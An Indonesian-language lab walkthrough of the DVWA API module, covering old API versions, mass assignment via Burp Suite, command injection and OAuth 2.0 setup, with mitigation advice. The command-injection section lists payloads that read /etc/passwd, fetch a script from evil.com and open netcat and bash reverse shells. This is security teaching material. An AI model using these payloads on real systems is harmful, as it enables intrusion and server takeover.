## INTRO

### Apa itu API?

API (Application Programming Interface) adalah antarmuka yang memungkinkan komunikasi antara aplikasi atau sistem yang berbeda. Dalam konteks web, API adalah mekanisme yang memungkinkan aplikasi web untuk berinteraksi dengan server, mengambil data, atau melakukan operasi tertentu tanpa perlu memuat ulang seluruh halaman.

**Karakteristik API modern:**

- **RESTful API**: Menggunakan HTTP methods (GET, POST, PUT, DELETE) untuk operasi CRUD
- **JSON Format**: Data dikirim dan diterima dalam format JSON
- **Stateless**: Setiap request berdiri sendiri tanpa menyimpan session di server
- **Endpoint**: URL khusus yang menerima request (contoh: /api/v1/users)

### Mengapa API Rentan?

API sering kali menjadi target serangan karena beberapa alasan:

- Developer tidak selalu memvalidasi data yang diterima dari client, membuka pintu untuk injection attacks
- Token atau session management yang tidak aman memungkinkan attacker mengakses data tanpa otorisasi
- API tidak memeriksa apakah user memiliki hak akses untuk melakukan operasi tertentu
- API menerima parameter yang tidak seharusnya dapat diubah oleh user
- Versi lama API masih aktif dengan kerentanan yang sudah diperbaiki di versi baru
- API mengembalikan data sensitif yang seharusnya tidak terekspos
- Input user dieksekusi sebagai system command tanpa sanitasi

### Dampak Eksploitasi API

Eksploitasi kerentanan API dapat menimbulkan dampak serius:

- Akses tidak sah ke data sensitif seperti password hash, informasi pribadi user, atau data bisnis rahasia
- User biasa dapat meningkatkan privilege menjadi admin dan mengontrol seluruh sistem
- Attacker dapat mengubah, menghapus, atau menambah data tanpa otorisasi
- Dalam kasus command injection, attacker dapat menjalankan arbitrary commands di server
- Kontrol penuh atas server dan infrastruktur aplikasi
- Kehilangan kepercayaan user dan kerugian finansial akibat security breach

## Percobaan Serangan Di DVWA

### LEVEL LOW

Level Low mengeksploitasi kerentanan **API Versioning**. Aplikasi menjalankan beberapa versi API secara bersamaan, tetapi versi lama (v1) masih aktif dan mengandung kerentanan information disclosure. Versi baru (v2) sudah memperbaiki masalah ini, namun karena versi lama tidak di-deprecate, attacker dapat mengakses endpoint lama untuk mendapatkan data sensitif.


```javascript
function get_users() {
    const url = '" . $stripped_url . "/vulnerabilities/api/v2/user/';
     
    fetch(url, { 
            method: 'GET',
        }) 
        .then(response => { 
            if (!response.ok) { 
                throw new Error('Network response was not ok'); 
        } 
        return response.json(); 
        }) 
        .then(data => { 
            loadTableData(data);
        }) 
        .catch(error => { 
            console.error('There was a problem with your fetch operation:', error); 
    }); 
}
```

Kode ini menggunakan endpoint versi 2 (`/api/v2/user/`), namun tidak ada validasi atau pembatasan akses ke versi sebelumnya. User dapat secara manual mengakses `/api/v1/user/` yang mungkin mengandung kerentanan.

Untuk cara eksploitasinya kita bisa buka browser dan akses url :


```
http://localhost/vulnerabilities/api/
```

### LEVEL MEDIUM

Di level medium, tujuan utama kita adalah menaikkan privilege user dari level user (1) ke admin (0) menggunakan mass assignment. Bisa dilihat bahwa halaman Medium Level menampilkan form untuk mengubah nama user.

![Gamabar_weak_Api](assets/image/2026-02-14-wak-api/image4.png)

Dari kode level medium, ada dua function penting:
+ get_user() untuk GET request ke /vulnerabilities/api/v2/user/2
+ update_name() untuk PUT request ke endpoint yang sama

Dan pada function `update_name` memiliki kerentanan dimana tidak ada validasi parameter yang dikirim.

```php
// Tidak ada validasi parameter yang dikirim
fetch(url, { 
    method: 'PUT',
    headers: { 
        'Content-Type': 'application/json' 
    }, 
    body: data  // Data bisa dimanipulasi
})
```

Kita juga diberi tahu bahwa ada perbedaan anatara UserUpdate dan UserAdd

+ UserUpdate (yang digunakan):

```yaml
UserUpdate:
  required:
    - name
  properties:
    name:
      type: string
```

+ UserAdd (dengan parameter tambahan):

```yaml
UserAdd:
  required:
    - level
    - name
  properties:
    name:
      type: string
    level:
      type: integer
```

untuk eksploitasinya kita menggunakan Intercept Proxy (Burp Suite)

Pertama kita buka Burp Suite dan aktifkan intercept untuk request PUT. selanjutnya lakukan submit form dengan nama baru

**Request asli:**

```json

  "name": "test"
}
```

**Modifikasi body request:**

```json

  "name": "hacked",
  "level": 0
}
```

Setelah request berhasil, halaman akan menampilkan pesan sukses dan level user berubah menjadi admin.

![Gamabar_weak_Api](assets/image/2026-02-14-wak-api/image7.png)

Jadi kerentanan mass assignment terjadi karena server tidak memvalidasi parameter yang dikirim. Endpoint PUT untuk update user seharusnya hanya menerima parameter name, tapi ternyata juga menerima parameter level yang seharusnya tidak bisa diubah oleh user biasa.

### LEVEL HIGH

Level High mengeksploitasi kerentanan **Command Injection**. API menyediakan endpoint `/health/connectivity` yang menerima parameter `target` untuk melakukan ping test. Input user langsung dieksekusi sebagai system command tanpa sanitasi, memungkinkan attacker untuk inject arbitrary OS commands.

Pertama kita download terlebih dahulu dan file openapi.yml yang disediakan dan .

![Gamabar_weak_Api](assets/image/2026-02-14-wak-api/image9.png)

Endpoint yang tersedia:
+ /health/echo - POST
+ /health/connectivity - POST
+ /health/disk - POST
+ /health/services - POST

selanjutnya import OpenAPI document ke Postman.

![Gamabar_weak_Api](assets/image/2026-02-14-wak-api/image8.png)

Dari hint, endpoint /health/connectivity melakukan ping ke target dan rentan terhadap command injection. Endpoint connectivity melakukan ping ke target yang diberikan. Backend kemungkinan menggunakan command seperti:

```bash
ping -c 4 [target]
```

Untuk itu kita coba test endpoint tersebut dengan inputan target yang valid. untuk targetnya kita ubah menjadi 127.0.0.1 atau localhost. Response akan menampilkan hasil ping command.

![Gamabar_weak_Api](assets/image/2026-02-14-wak-api/image10.png)

Selanjutnya kita akan mencoba memasukan command injection adengan payload :

```
127.0.0.1; whoami
```

Command yang akan dieksekusi di server kurang lebih jadinya seperti `ping -c 4 127.0.0.1; whoami`. Ini akan menjalankan ping, kemudian menjalankan `whoami` yang menampilkan username server.

![Gamabar_weak_Api](assets/image/2026-02-14-wak-api/image11.png)

#### Step 5: Eksploitasi lebih lanjut

Setelah memverifikasi command injection, attacker dapat menjalankan berbagai command:

- **List directory**: `127.0.0.1; ls -la`
- **Read sensitive files**: `127.0.0.1; cat /etc/passwd`
- **Reverse shell**: `127.0.0.1; nc -e /bin/bash [attacker-ip] 4444`
- **Download malware**: `127.0.0.1; wget http://evil.com/shell.sh -O /tmp/shell.sh`

![PLACEHOLDER SCREENSHOT 15: Eksekusi command ls -la untuk list directory]

#### Step 6: Establish persistent access

Untuk mendapatkan shell interaktif, gunakan reverse shell payload:

**1. Di attacker machine, listen pada port:**
```bash
nc -lvnp 4444
```

**2. Inject payload di target:**
```
127.0.0.1; bash -i >& /dev/tcp/[attacker-ip]/4444 0>&1
```

![PLACEHOLDER SCREENSHOT 16: Reverse shell connection established]

### 4.4 Kesimpulan Level High

- **Kerentanan**: Command injection akibat input user yang langsung dieksekusi sebagai system command tanpa sanitasi.
- **Dampak**: Remote Code Execution (RCE) yang memungkinkan attacker untuk mengambil alih server sepenuhnya, membaca file sensitif, install backdoor, atau menggunakan server sebagai pivot point untuk menyerang sistem lain.
- **Mitigasi**: Jangan pernah menjalankan system command dengan input dari user. Jika perlu, gunakan whitelist input yang ketat, escape special characters, atau gunakan library yang sudah aman. Implementasikan principle of least privilege untuk user yang menjalankan web server.

## 5. LEVEL IMPOSSIBLE: OAUTH 2.0 AUTHENTICATION

### 5.1 Deskripsi Challenge

Level Impossible bukanlah tentang eksploitasi kerentanan, melainkan sebuah challenge untuk mengautomasi proses autentikasi menggunakan **OAuth 2.0** dalam testing tool seperti Postman atau Burp Suite. Tujuannya adalah memahami dan mengimplementasikan OAuth 2.0 flow dengan benar, termasuk token management (access token dan refresh token).

### 5.2 Konsep OAuth 2.0

#### 5.2.1 Apa itu OAuth 2.0?

OAuth 2.0 adalah protokol autentikasi dan autorisasi yang memungkinkan aplikasi untuk mengakses resource yang dilindungi atas nama user tanpa perlu mengetahui password user. OAuth 2.0 digunakan secara luas untuk API authentication.

#### 5.2.2 OAuth 2.0 Flow Components

- **Client ID**: Identifier unik untuk aplikasi yang melakukan request
- **Client Secret**: Password rahasia untuk aplikasi
- **Authorization Endpoint**: URL untuk mendapatkan authorization code
- **Token Endpoint**: URL untuk exchange authorization code menjadi access token
- **Access Token**: Token yang digunakan untuk mengakses protected resources
- **Refresh Token**: Token untuk mendapatkan access token baru ketika yang lama expired

### 5.3 Langkah-Langkah Setup OAuth 2.0 di Postman

#### Step 1: Buat Collection baru di Postman

Buka Postman dan buat collection baru untuk DVWA API testing.

#### Step 2: Configure Authorization

Pergi ke tab **Authorization** di collection settings. Pilih **Type: OAuth 2.0**

#### Step 3: Masukkan OAuth 2.0 Configuration

Isi field berikut (sesuaikan dengan konfigurasi DVWA):

- **Token Name**: `DVWA OAuth`
- **Grant Type**: `Authorization Code`
- **Callback URL**: `https://oauth.pstmn.io/v1/callback`

- **Access Token URL**: `http://[dvwa-url]/token`
- **Client ID**: `[dari DVWA]`
- **Client Secret**: `[dari DVWA]`

![PLACEHOLDER SCREENSHOT 19: OAuth 2.0 configuration filled]

#### Step 4: Get New Access Token

Klik tombol **Get New Access Token**. Postman akan membuka browser untuk authorization. Login dengan credentials DVWA dan authorize aplikasi.

### 5.4 Token Lifecycle Management

#### 5.4.1 Access Token Expiration

Access token memiliki lifetime terbatas (misalnya 3600 detik / 1 jam). Ketika token expired, API akan mengembalikan error `401 Unauthorized`.

#### 5.4.2 Refresh Token Usage

Untuk mendapatkan access token baru tanpa perlu login ulang, gunakan refresh token. Postman akan otomatis melakukan refresh ketika detect token expired, atau Anda dapat manual refresh.

**Manual refresh process:**

1. Kirim POST request ke `/token`
2. Body: `grant_type=refresh_token&refresh_token=[token]`
3. Receive new access token dan refresh token

![PLACEHOLDER SCREENSHOT 24: Refresh token request dan response]

### 5.5 Kesimpulan Level Impossible

- **Tujuan**: Belajar mengautomasi OAuth 2.0 authentication flow dalam API testing tools untuk efisiensi testing.
- **Skill yang Dipelajari**: OAuth 2.0 implementation, token lifecycle management, automated token refresh, dan integration antara Postman dengan Burp Suite.
- **Best Practice**: Selalu monitor semua OAuth flow melalui proxy untuk understanding mendalam tentang bagaimana token diexchange dan digunakan. Simpan token securely dan rotate regularly.

## 6. KESIMPULAN UMUM

### 6.1 Ringkasan Kerentanan

Modul API DVWA mengajarkan beberapa kerentanan kritis yang sering ditemukan dalam implementasi API real-world:

1. **API Versioning Issues (Low)**: Versi lama API yang tidak di-deprecate mengekspos data sensitif
2. **Mass Assignment (Medium)**: Kurangnya validasi parameter memungkinkan privilege escalation
3. **Command Injection (High)**: Input tidak tersanitasi menyebabkan Remote Code Execution
4. **OAuth 2.0 Automation (Impossible)**: Challenge untuk memahami dan mengautomasi modern authentication

### 6.2 Prinsip Keamanan API

Berdasarkan pembelajaran dari DVWA, berikut adalah prinsip-prinsip penting dalam mengamankan API:

- **Input Validation**: Selalu validasi dan sanitasi semua input dari client. Never trust user input.
- **Authentication & Authorization**: Implementasi autentikasi yang kuat dan verifikasi otorisasi di setiap endpoint.
- **Principle of Least Privilege**: User dan service hanya memiliki akses minimal yang dibutuhkan.
- **API Versioning**: Deprecate dan disable versi lama securely. Jangan biarkan vulnerabilities persist.
- **Rate Limiting**: Implementasi rate limiting untuk mencegah abuse dan brute force attacks.
- **Logging & Monitoring**: Log semua API activity dan monitor untuk suspicious patterns.
- **Security Testing**: Regular penetration testing dan vulnerability scanning pada API endpoints.
- **Data Exposure**: Jangan expose sensitive data seperti password hash, internal IDs, atau business logic.

### 6.3 Tools untuk API Security Testing

- **Burp Suite**: Comprehensive web application security testing dengan powerful proxy dan scanner
- **Postman**: API development dan testing dengan automation capabilities
- **OWASP ZAP**: Open source alternative untuk Burp Suite dengan API scanning features
- **Swagger/OpenAPI**: API documentation dan testing tools yang memudahkan exploration
- **Sqlmap**: Automated SQL injection testing
- **Nikto**: Web server vulnerability scanner
